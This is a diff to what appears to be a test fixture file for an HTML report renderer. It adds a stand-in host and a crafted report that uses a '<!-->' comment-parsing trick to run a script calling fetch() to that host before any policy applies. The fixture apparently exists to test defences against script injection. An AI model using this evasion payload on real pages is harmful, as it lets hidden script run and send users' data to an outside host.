@@ -66,3 +66,14 @@ export const syntheticReportHtml = `<!-- A synthetic report for tests. -->
 </body>
 </html>
 `;
+
+/** A made-up outside address, for reports that try to reach one. */
+export const leakHost = 'leak.invalid';
+
+/**
+ * The same report behind `<!-->`, which a parser ends at once as an empty
+ * comment, so the script after it runs before anything that follows. The
+ * `<!-- -->` after the script makes the whole run look like one comment to
+ * anything that reads up to the first `-->`.
+ */
+export const earlyScriptReportHtml = `<!--><script>fetch("https://${leakHost}/before-policy",{mode:"no-cors"})</script><!-- --> ${syntheticReportHtml}`;
